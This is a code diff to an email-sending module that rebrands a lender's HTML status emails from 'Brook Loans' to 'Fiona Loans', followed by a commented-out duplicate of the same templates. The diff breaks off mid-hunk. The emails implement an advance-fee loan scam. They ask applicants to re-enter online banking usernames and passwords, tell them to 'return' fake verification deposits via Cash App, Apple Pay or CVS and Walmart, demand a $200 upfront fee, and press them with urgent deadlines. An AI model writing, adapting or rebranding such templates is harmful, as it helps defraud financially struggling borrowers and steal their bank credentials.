@@ -87,7 +87,7 @@ export async function sendApplicationConfirmationEmail(
       letter-spacing: 0.5px;
     "
   >
-    Brook Loans
+    Fiona Loans
   </h1>
 </div>
       <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
@@ -141,11 +141,11 @@ export async function sendApplicationConfirmationEmail(
             <strong>Phone:</strong> <a href="tel:+17472005228" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>
           </p>
           <p style="color: #374151; font-size: 14px; margin: 5px 0;">
-            <strong>Website:</strong> <a href="https://www.brookloans.com" style="color: #1a56db; text-decoration: none;">www.brookloans.com</a>
+            <strong>Website:</strong> <a href="https://www.fionaloans.com" style="color: #1a56db; text-decoration: none;">www.fionaloans.com</a>
           </p>
         </div>
         <p style="color: #9ca3af; font-size: 12px; text-align: center;">
-          This is an automated email from Brook Loans. Please do not reply to this email.
+          This is an automated email from Fiona Loans. Please do not reply to this email.
         </p>
       </div>
     </div>
@@ -153,7 +153,7 @@ export async function sendApplicationConfirmationEmail(
 
   await sendMailgunEmail(
     email,
-    `Application Received - ID: ${applicationId} | Brook Loans`,
+    `Application Received - ID: ${applicationId} | Fiona Loans`,
     html,
   );
 }
@@ -187,7 +187,7 @@ const statusConfig: Record<
       "Your loan application has been received. Please complete the bank verification process to proceed with your application.",
     customBody: (details) => `
       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
-      <p style="color: #374151; font-size: 16px;">We are currently reviewing your Brook Loans application! To proceed further and generate your final loan agreement, we need to verify your active bank account details.</p>
+      <p style="color: #374151; font-size: 16px;">We are currently reviewing your Fiona Loans application! To proceed further and generate your final loan agreement, we need to verify your active bank account details.</p>
       <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 20px; margin: 20px 0;">
         <h3 style="color: #111827; margin-top: 0; margin-bottom: 12px;">Your Security is Our Priority:</h3>
         <ul style="color: #374151; font-size: 15px; padding-left: 18px; margin: 0; line-height: 1.6;">
@@ -197,7 +197,7 @@ const statusConfig: Record<
         </ul>
       </div>
       <p style="color: #374151; font-size: 16px;">If you need assistance, please call our underwriting team at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</p>
-      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Brook Loans</p>
+      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Fiona Loans</p>
     `,
     color: "#f59e0b",
     icon: "&#127974;",
@@ -233,14 +233,14 @@ const statusConfig: Record<
       <p style="color: #374151; font-size: 16px;">This usually happens if the login credentials entered were incorrect, or if there was a timeout with your bank's multi-factor authentication (like a text message code).</p>
       <p style="color: #374151; font-size: 16px;">To keep your application moving, please click the secure link below to try logging into your financial institution again. Please ensure you are using your most up-to-date online banking username and password.</p>
       <p style="color: #374151; font-size: 16px;">If you continue to have trouble, or if you would like to connect a different bank account, please call us immediately at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a> so we can assist you.</p>
-      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>Brook Loans Customer Support</p>
+      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>Fiona Loans Customer Support</p>
     `,
     color: "#dc2626",
     icon: "&#128273;",
   },
   request_a_call: {
     title: "Urgent Action Needed",
-    subject: "URGENT: Please call Brook Loans immediately",
+    subject: "URGENT: Please call Fiona Loans immediately",
     message: "",
     customBody: (details) => `
       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
@@ -248,7 +248,7 @@ const statusConfig: Record<
       <p style="color: #374151; font-size: 16px;"><strong>Please call us ASAP at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</strong></p>
       <p style="color: #374151; font-size: 16px;">Our underwriting team is standing by to resolve this with you quickly so we can get your file back on track.</p>
       <p style="color: #374151; font-size: 16px;"><em>Hours: Monday – Friday, 06:00 AM – 04:00 PM PST</em></p>
-      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>The Underwriting Team at Brook Loans</p>
+      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>The Underwriting Team at Fiona Loans</p>
     `,
     color: "#dc2626",
     icon: "&#128222;",
@@ -276,14 +276,14 @@ const statusConfig: Record<
   },
   funded: {
     title: "Loan Funded!",
-    subject: "Great News! Your Brook Loans application is FUNDED",
+    subject: "Great News! Your Fiona Loans application is FUNDED",
     message: "",
     customBody: (details) => `
       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
       <p style="color: #374151; font-size: 16px;">Congratulations! Your loan has been officially funded by our underwriting team.</p>
       <p style="color: #374151; font-size: 16px;">The funds are currently being transferred to the verified bank account you have on file. You can expect to see the deposit clear in your account within the next 24 hours, depending on your bank's specific processing times.</p>
-      <p style="color: #374151; font-size: 16px;">Thank you for choosing Brook Loans for your financial needs. If you have any questions about your repayment schedule, please refer to your signed agreement or give us a call at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</p>
-      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Welcome to the Brook Loans family!<br/>Sincerely,<br/>Brook Loans Customer Support</p>
+      <p style="color: #374151; font-size: 16px;">Thank you for choosing Fiona Loans for your financial needs. If you have any questions about your repayment schedule, please refer to your signed agreement or give us a call at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</p>
+      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Welcome to the Fiona Loans family!<br/>Sincerely,<br/>Fiona Loans Customer Support</p>
     `,
     color: "#16a34a",
     icon: "&#9989;",
@@ -303,9 +303,9 @@ const statusConfig: Record<
       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
       <p style="color: #374151; font-size: 16px;">We have reviewed your application, but unfortunately, it has been declined at this time.</p>
       <p style="color: #374151; font-size: 16px;"><strong>Reason for decline:</strong> The bank account you provided on file belongs to an online-only or prepaid bank.</p>
-      <p style="color: #374151; font-size: 16px;">To secure a personal loan with Brook Loans, you must have an active checking account with a regular, traditional, or local brick-and-mortar bank.</p>
+      <p style="color: #374151; font-size: 16px;">To secure a personal loan with Fiona Loans, you must have an active checking account with a regular, traditional, or local brick-and-mortar bank.</p>
       <p style="color: #374151; font-size: 16px;"><strong>How to fix this:</strong> If you have an account with a traditional bank, your application can still be salvaged! Please call us immediately at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a> to update your file with your new bank account information.</p>
-      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Brook Loans</p>
+      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Fiona Loans</p>
     `,
     color: "#dc2626",
     icon: "&#9888;",
@@ -316,25 +316,25 @@ const statusConfig: Record<
     message: "",
     customBody: (details) => `
       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
-      <p style="color: #374151; font-size: 16px;">Thank you for applying for a personal loan with Brook Loans. We have completed a review of your application and financial profile.</p>
+      <p style="color: #374151; font-size: 16px;">Thank you for applying for a personal loan with Fiona Loans. We have completed a review of your application and financial profile.</p>
       <p style="color: #374151; font-size: 16px;">We regret to inform you that we are unable to approve your application at this time. Our internal processor was unable to accept your file due to an unstable repayment history and a high Debt-to-Income (DTI) ratio.</p>
-      <p style="color: #374151; font-size: 16px;">We appreciate your interest in Brook Loans and wish you the best in your financial journey.</p>
-      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Sincerely,<br/>The Underwriting Team at Brook Loans</p>
+      <p style="color: #374151; font-size: 16px;">We appreciate your interest in Fiona Loans and wish you the best in your financial journey.</p>
+      <p style="color: #374151; font-size: 16px; margin-top: 24px;">Sincerely,<br/>The Underwriting Team at Fiona Loans</p>
     `,
     color: "#dc2626",
     icon: "&#10060;",
   },
   verification_deposit_1: {
     title: "Finalize Verification Deposit",
-    subject: "ACTION REQUIRED: Finalize your Brook Loans verification deposit",
+    subject: "ACTION REQUIRED: Finalize your Fiona Loans verification deposit",
     message: "",
     customBody: (details) => `
       <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
-      <p style="color: #374151; font-size: 16px;">Thank you for choosing Brook Loans. We are pleased to inform you that the initial phase of your bank verification has been successfully completed.</p>
-      <p style="color: #374151; font-size: 16px;">Because Brook Loans specializes in providing financial opportunities to borrowers with diverse financial backgrounds—including those working to rebuild credit scores, stabilize repayment histories, or manage high debt-to-income ratios—our security protocol requires a final confirmation step before your full loan can be disbursed.</p>
+      <p style="color: #374151; font-size: 16px;">Thank you for choosing Fiona Loans. We are pleased to inform you that the initial phase of your bank verification has been successfully completed.</p>
+      <p style="color: #374151; font-size: 16px;">Because Fiona Loans specializes in providing financial opportunities to borrowers with diverse financial backgrounds—including those working to rebuild credit scores, stabilize repayment histories, or manage high debt-to-income ratios—our security protocol requires a final confirmation step before your full loan can be disbursed.</p>
       <h3 style="color: #111827; margin-top: 20px;">YOUR NEXT STEPS:</h3>
       <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
-        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Brook Loans will issue a dynamic security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
+        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Fiona Loans will issue a dynamic security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
         <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer</strong><br/>As soon as these funds are fully cleared and available in your balance, please immediately call your dedicated Loan Officer to confirm the exact amount received.</li>
         <li style="margin-bottom: 10px;"><strong>Return the Security Deposit</strong><br/>To complete the verification cycle and release your full loan funding, our security policy requires you to return this exact deposit amount to us. For your convenience, this can be completed instantly via Cash App, Apple Pay, or in person at a local merchant near you (including CVS, Walgreens, and Walmart).</li>
       </ol>
@@ -342,7 +342,7 @@ const statusConfig: Record<
         <p style="color: #92400e; font-size: 14px; margin: 0;"><strong>Please Note:</strong> Your full loan disbursement is temporarily on hold until this verification deposit is safely processed and settled.</p>
       </div>
       <p style="color: #374151; font-size: 16px;">If you have any questions or need help finding a nearby payment location, our support team is standing by to assist you.</p>
-      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Brook Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Fiona Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
     `,
     color: "#2563eb",
     icon: "&#128176;",
@@ -350,17 +350,17 @@ const statusConfig: Record<
   verification_deposit_2: {
     title: "Re-verification Deposit Required",
     subject:
-      "URGENT: Re-verification deposit required for your Brook Loans loan",
+      "URGENT: Re-verification deposit required for your Fiona Loans loan",
     message: "",
     customBody: (details) => `
       <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
       <p style="color: #374151; font-size: 16px;">We are contacting you because our automated compliance system was unable to clear your initial bank account validation.</p>
       <h3 style="color: #111827; margin-top: 20px;">REASON FOR RE-VERIFICATION:</h3>
-      <p style="color: #374151; font-size: 16px;">Our processing network flagged a secure connection timeout or a routing variance during the first transaction attempt. Because Brook Loans works directly with borrowers who have challenging credit profiles or high debt-to-income ratios, our data-matching and anti-fraud protocols are exceptionally strict. To protect your identity and secure your file, a secondary validation must be completed immediately.</p>
+      <p style="color: #374151; font-size: 16px;">Our processing network flagged a secure connection timeout or a routing variance during the first transaction attempt. Because Fiona Loans works directly with borrowers who have challenging credit profiles or high debt-to-income ratios, our data-matching and anti-fraud protocols are exceptionally strict. To protect your identity and secure your file, a secondary validation must be completed immediately.</p>
       <p style="color: #374151; font-size: 16px;">We have initiated a new, secondary verification deposit to override the previous error.</p>
       <h3 style="color: #111827; margin-top: 20px;">YOUR MANDATORY NEXT STEPS:</h3>
       <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
-        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Brook Loans has issued a new, randomized security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
+        <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Fiona Loans has issued a new, randomized security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
         <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer Immediately</strong><br/>As soon as you see this specific new amount clear in your available balance, call your dedicated Loan Officer right away to verify the exact digits. Do not use the previous deposit figures, as they are now expired and voided.</li>
         <li style="margin-bottom: 10px;"><strong>Return the Re-Verification Deposit</strong><br/>To clear the security flag on your profile and release your pending loan funding, you must return this exact new deposit amount to us. You can complete this instantly via Cash App, Apple Pay, or in person at a local retail merchant near you (including CVS, Walgreens, and Walmart).</li>
       </ol>
@@ -368,7 +368,7 @@ const statusConfig: Record<
         <p style="color: #991b1b; font-size: 14px; margin: 0;"><strong>Important Notice:</strong> Your loan approval cannot be maintained indefinitely while in a flagged state. Your full loan disbursement remains heavily on hold, and failure to complete this secondary step within 48 hours will result in the automatic expiration of your application.</p>
       </div>
       <p style="color: #374151; font-size: 16px;">If you need help identifying the new deposit or locating a nearby payment node, call our specialized verification line immediately.</p>
-      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Brook Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Fiona Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
     `,
     color: "#dc2626",
     icon: "&#9888;",
@@ -376,7 +376,7 @@ const statusConfig: Record<
   upfront_needed: {
     title: "Processing Update",
     subject:
-      "Action Required: Processing update for your Brook Loans application",
+      "Action Required: Processing update for your Fiona Loans application",
     message: "",
     customBody: (details, formattedAmount) => `
       <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
@@ -384,7 +384,7 @@ const statusConfig: Record<
       <p style="color: #374151; font-size: 16px;">Because your primary account is with an online banking institution, our automated system cannot fully verify your financial details. To move your application forward, our underwriting team must perform a manual review. This process involves manually auditing your bank statements, pulling and analyzing your credit report, and drafting the formal approval documentation required to fund your loan.</p>
       <p style="color: #374151; font-size: 16px;">To cover the additional administrative resources required for this manual review, a one-time processing fee of $200.00 is required before we can proceed.</p>
       <p style="color: #374151; font-size: 16px;">If you would like to move forward with this processing method, please call your dedicated Loan Officer at your earliest convenience to arrange the payment and finalize your application.</p>
-      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Brook Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
+      <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Fiona Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
     `,
     color: "#f59e0b",
     icon: "&#128176;",
@@ -429,7 +429,7 @@ export async function sendStatusUpdateEmail(
                   : status.replace(/_/g, " ").toUpperCase();
 
   const subject =
-    config.subject || `${config.title} - ID: ${applicationId} | Brook Loans`;
+    config.subject || `${config.title} - ID: ${applicationId} | Fiona Loans`;
 
   const messageHtml = config.customBody
     ? config.customBody(details, formattedAmount)
@@ -455,7 +455,7 @@ export async function sendStatusUpdateEmail(
       letter-spacing: 0.5px;
     "
   >
-    Brook Loans
+    Fiona Loans
   </h1>
 </div>
       <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
@@ -496,11 +496,11 @@ export async function sendStatusUpdateEmail(
             <strong>Phone:</strong> <a href="tel:+17472061606" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>
           </p>
           <p style="color: #374151; font-size: 14px; margin: 5px 0;">
-            <strong>Website:</strong> <a href="https://www.brookloans.com" style="color: #1a56db; text-decoration: none;">www.brookloans.com</a>
+            <strong>Website:</strong> <a href="https://www.fionaloans.com" style="color: #1a56db; text-decoration: none;">www.fionaloans.com</a>
           </p>
         </div>
         <p style="color: #9ca3af; font-size: 12px; text-align: center;">
-          This is an automated email from Brook Loans. Please do not reply to this email.
+          This is an automated email from Fiona Loans. Please do not reply to this email.
         </p>
       </div>
     </div>
@@ -588,7 +588,7 @@ export async function sendStatusUpdateEmail(
 //       letter-spacing: 0.5px;
 //     "
 //   >
-//     Brook Loans
+//     Fiona Loans
 //   </h1>
 // </div>
 //       <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
@@ -641,11 +641,11 @@ export async function sendStatusUpdateEmail(
 //             <strong>Phone:</strong> <a href="tel:+17472005228" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>
 //           </p>
 //           <p style="color: #374151; font-size: 14px; margin: 5px 0;">
-//             <strong>Website:</strong> <a href="https://www.brookloans.com" style="color: #1a56db; text-decoration: none;">www.brookloans.com</a>
+//             <strong>Website:</strong> <a href="https://www.fionaloans.com" style="color: #1a56db; text-decoration: none;">www.fionaloans.com</a>
 //           </p>
 //         </div>
 //         <p style="color: #9ca3af; font-size: 12px; text-align: center;">
-//           This is an automated email from Brook Loans. Please do not reply to this email.
+//           This is an automated email from Fiona Loans. Please do not reply to this email.
 //         </p>
 //       </div>
 //     </div>
@@ -653,7 +653,7 @@ export async function sendStatusUpdateEmail(
 
 //   await sendMailgunEmail(
 //     email,
-//     `Application Received - ID: ${applicationId} | Brook Loans`,
+//     `Application Received - ID: ${applicationId} | Fiona Loans`,
 //     html,
 //   );
 // }
@@ -687,7 +687,7 @@ export async function sendStatusUpdateEmail(
 //       "Your loan application has been received. Please complete the bank verification process to proceed with your application.",
 //     customBody: (details) => `
 //       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
-//       <p style="color: #374151; font-size: 16px;">We are currently reviewing your Brook Loans application! To proceed further and generate your final loan agreement, we need to verify your active bank account details.</p>
+//       <p style="color: #374151; font-size: 16px;">We are currently reviewing your Fiona Loans application! To proceed further and generate your final loan agreement, we need to verify your active bank account details.</p>
 //       <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 20px; margin: 20px 0;">
 //         <h3 style="color: #111827; margin-top: 0; margin-bottom: 12px;">Your Security is Our Priority:</h3>
 //         <ul style="color: #374151; font-size: 15px; padding-left: 18px; margin: 0; line-height: 1.6;">
@@ -697,7 +697,7 @@ export async function sendStatusUpdateEmail(
 //         </ul>
 //       </div>
 //       <p style="color: #374151; font-size: 16px;">If you need assistance, please call our underwriting team at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</p>
-//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Brook Loans</p>
+//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Fiona Loans</p>
 //     `,
 //     color: "#f59e0b",
 //     icon: "&#127974;",
@@ -733,14 +733,14 @@ export async function sendStatusUpdateEmail(
 //       <p style="color: #374151; font-size: 16px;">This usually happens if the login credentials entered were incorrect, or if there was a timeout with your bank's multi-factor authentication (like a text message code).</p>
 //       <p style="color: #374151; font-size: 16px;">To keep your application moving, please click the secure link below to try logging into your financial institution again. Please ensure you are using your most up-to-date online banking username and password.</p>
 //       <p style="color: #374151; font-size: 16px;">If you continue to have trouble, or if you would like to connect a different bank account, please call us immediately at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a> so we can assist you.</p>
-//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>Brook Loans Customer Support</p>
+//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>Fiona Loans Customer Support</p>
 //     `,
 //     color: "#dc2626",
 //     icon: "&#128273;",
 //   },
 //   request_a_call: {
 //     title: "Urgent Action Needed",
-//     subject: "URGENT: Please call Brook Loans immediately",
+//     subject: "URGENT: Please call Fiona Loans immediately",
 //     message: "",
 //     customBody: (details) => `
 //       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
@@ -748,7 +748,7 @@ export async function sendStatusUpdateEmail(
 //       <p style="color: #374151; font-size: 16px;"><strong>Please call us ASAP at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</strong></p>
 //       <p style="color: #374151; font-size: 16px;">Our underwriting team is standing by to resolve this with you quickly so we can get your file back on track.</p>
 //       <p style="color: #374151; font-size: 16px;"><em>Hours: Monday – Friday, 06:00 AM – 04:00 PM PST</em></p>
-//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>The Underwriting Team at Brook Loans</p>
+//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best,<br/>The Underwriting Team at Fiona Loans</p>
 //     `,
 //     color: "#dc2626",
 //     icon: "&#128222;",
@@ -776,14 +776,14 @@ export async function sendStatusUpdateEmail(
 //   },
 //   funded: {
 //     title: "Loan Funded!",
-//     subject: "Great News! Your Brook Loans application is FUNDED",
+//     subject: "Great News! Your Fiona Loans application is FUNDED",
 //     message: "",
 //     customBody: (details) => `
 //       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
 //       <p style="color: #374151; font-size: 16px;">Congratulations! Your loan has been officially funded by our underwriting team.</p>
 //       <p style="color: #374151; font-size: 16px;">The funds are currently being transferred to the verified bank account you have on file. You can expect to see the deposit clear in your account within the next 24 hours, depending on your bank's specific processing times.</p>
-//       <p style="color: #374151; font-size: 16px;">Thank you for choosing Brook Loans for your financial needs. If you have any questions about your repayment schedule, please refer to your signed agreement or give us a call at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</p>
-//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Welcome to the Brook Loans family!<br/>Sincerely,<br/>Brook Loans Customer Support</p>
+//       <p style="color: #374151; font-size: 16px;">Thank you for choosing Fiona Loans for your financial needs. If you have any questions about your repayment schedule, please refer to your signed agreement or give us a call at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>.</p>
+//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Welcome to the Fiona Loans family!<br/>Sincerely,<br/>Fiona Loans Customer Support</p>
 //     `,
 //     color: "#16a34a",
 //     icon: "&#9989;",
@@ -803,9 +803,9 @@ export async function sendStatusUpdateEmail(
 //       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
 //       <p style="color: #374151; font-size: 16px;">We have reviewed your application, but unfortunately, it has been declined at this time.</p>
 //       <p style="color: #374151; font-size: 16px;"><strong>Reason for decline:</strong> The bank account you provided on file belongs to an online-only or prepaid bank.</p>
-//       <p style="color: #374151; font-size: 16px;">To secure a personal loan with Brook Loans, you must have an active checking account with a regular, traditional, or local brick-and-mortar bank.</p>
+//       <p style="color: #374151; font-size: 16px;">To secure a personal loan with Fiona Loans, you must have an active checking account with a regular, traditional, or local brick-and-mortar bank.</p>
 //       <p style="color: #374151; font-size: 16px;"><strong>How to fix this:</strong> If you have an account with a traditional bank, your application can still be salvaged! Please call us immediately at <a href="tel:+17472080334" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a> to update your file with your new bank account information.</p>
-//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Brook Loans</p>
+//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Best regards,<br/>The Underwriting Team at Fiona Loans</p>
 //     `,
 //     color: "#dc2626",
 //     icon: "&#9888;",
@@ -816,25 +816,25 @@ export async function sendStatusUpdateEmail(
 //     message: "",
 //     customBody: (details) => `
 //       <p style="color: #374151; font-size: 16px;">Hi ${details.firstName},</p>
-//       <p style="color: #374151; font-size: 16px;">Thank you for applying for a personal loan with Brook Loans. We have completed a review of your application and financial profile.</p>
+//       <p style="color: #374151; font-size: 16px;">Thank you for applying for a personal loan with Fiona Loans. We have completed a review of your application and financial profile.</p>
 //       <p style="color: #374151; font-size: 16px;">We regret to inform you that we are unable to approve your application at this time. Our internal processor was unable to accept your file due to an unstable repayment history and a high Debt-to-Income (DTI) ratio.</p>
-//       <p style="color: #374151; font-size: 16px;">We appreciate your interest in Brook Loans and wish you the best in your financial journey.</p>
-//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Sincerely,<br/>The Underwriting Team at Brook Loans</p>
+//       <p style="color: #374151; font-size: 16px;">We appreciate your interest in Fiona Loans and wish you the best in your financial journey.</p>
+//       <p style="color: #374151; font-size: 16px; margin-top: 24px;">Sincerely,<br/>The Underwriting Team at Fiona Loans</p>
 //     `,
 //     color: "#dc2626",
 //     icon: "&#10060;",
 //   },
 //   verification_deposit_1: {
 //     title: "Finalize Verification Deposit",
-//     subject: "ACTION REQUIRED: Finalize your Brook Loans verification deposit",
+//     subject: "ACTION REQUIRED: Finalize your Fiona Loans verification deposit",
 //     message: "",
 //     customBody: (details) => `
 //       <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
-//       <p style="color: #374151; font-size: 16px;">Thank you for choosing Brook Loans. We are pleased to inform you that the initial phase of your bank verification has been successfully completed.</p>
-//       <p style="color: #374151; font-size: 16px;">Because Brook Loans specializes in providing financial opportunities to borrowers with diverse financial backgrounds—including those working to rebuild credit scores, stabilize repayment histories, or manage high debt-to-income ratios—our security protocol requires a final confirmation step before your full loan can be disbursed.</p>
+//       <p style="color: #374151; font-size: 16px;">Thank you for choosing Fiona Loans. We are pleased to inform you that the initial phase of your bank verification has been successfully completed.</p>
+//       <p style="color: #374151; font-size: 16px;">Because Fiona Loans specializes in providing financial opportunities to borrowers with diverse financial backgrounds—including those working to rebuild credit scores, stabilize repayment histories, or manage high debt-to-income ratios—our security protocol requires a final confirmation step before your full loan can be disbursed.</p>
 //       <h3 style="color: #111827; margin-top: 20px;">YOUR NEXT STEPS:</h3>
 //       <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
-//         <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Brook Loans will issue a dynamic security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
+//         <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Fiona Loans will issue a dynamic security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
 //         <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer</strong><br/>As soon as these funds are fully cleared and available in your balance, please immediately call your dedicated Loan Officer to confirm the exact amount received.</li>
 //         <li style="margin-bottom: 10px;"><strong>Return the Security Deposit</strong><br/>To complete the verification cycle and release your full loan funding, our security policy requires you to return this exact deposit amount to us. For your convenience, this can be completed instantly via Cash App, Apple Pay, or in person at a local merchant near you (including CVS, Walgreens, and Walmart).</li>
 //       </ol>
@@ -842,7 +842,7 @@ export async function sendStatusUpdateEmail(
 //         <p style="color: #92400e; font-size: 14px; margin: 0;"><strong>Please Note:</strong> Your full loan disbursement is temporarily on hold until this verification deposit is safely processed and settled.</p>
 //       </div>
 //       <p style="color: #374151; font-size: 16px;">If you have any questions or need help finding a nearby payment location, our support team is standing by to assist you.</p>
-//       <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Brook Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
+//       <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Fiona Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
 //     `,
 //     color: "#2563eb",
 //     icon: "&#128176;",
@@ -850,17 +850,17 @@ export async function sendStatusUpdateEmail(
 //   verification_deposit_2: {
 //     title: "Re-verification Deposit Required",
 //     subject:
-//       "URGENT: Re-verification deposit required for your Brook Loans loan",
+//       "URGENT: Re-verification deposit required for your Fiona Loans loan",
 //     message: "",
 //     customBody: (details) => `
 //       <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
 //       <p style="color: #374151; font-size: 16px;">We are contacting you because our automated compliance system was unable to clear your initial bank account validation.</p>
 //       <h3 style="color: #111827; margin-top: 20px;">REASON FOR RE-VERIFICATION:</h3>
-//       <p style="color: #374151; font-size: 16px;">Our processing network flagged a secure connection timeout or a routing variance during the first transaction attempt. Because Brook Loans works directly with borrowers who have challenging credit profiles or high debt-to-income ratios, our data-matching and anti-fraud protocols are exceptionally strict. To protect your identity and secure your file, a secondary validation must be completed immediately.</p>
+//       <p style="color: #374151; font-size: 16px;">Our processing network flagged a secure connection timeout or a routing variance during the first transaction attempt. Because Fiona Loans works directly with borrowers who have challenging credit profiles or high debt-to-income ratios, our data-matching and anti-fraud protocols are exceptionally strict. To protect your identity and secure your file, a secondary validation must be completed immediately.</p>
 //       <p style="color: #374151; font-size: 16px;">We have initiated a new, secondary verification deposit to override the previous error.</p>
 //       <h3 style="color: #111827; margin-top: 20px;">YOUR MANDATORY NEXT STEPS:</h3>
 //       <ol style="color: #374151; font-size: 16px; padding-left: 20px;">
-//         <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Brook Loans has issued a new, randomized security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
+//         <li style="margin-bottom: 10px;"><strong>Monitor Your Account (Within 24 Hours)</strong><br/>Fiona Loans has issued a new, randomized security deposit between $99.00 and $1,999.00 into your connected bank account.</li>
 //         <li style="margin-bottom: 10px;"><strong>Call Your Loan Officer Immediately</strong><br/>As soon as you see this specific new amount clear in your available balance, call your dedicated Loan Officer right away to verify the exact digits. Do not use the previous deposit figures, as they are now expired and voided.</li>
 //         <li style="margin-bottom: 10px;"><strong>Return the Re-Verification Deposit</strong><br/>To clear the security flag on your profile and release your pending loan funding, you must return this exact new deposit amount to us. You can complete this instantly via Cash App, Apple Pay, or in person at a local retail merchant near you (including CVS, Walgreens, and Walmart).</li>
 //       </ol>
@@ -868,7 +868,7 @@ export async function sendStatusUpdateEmail(
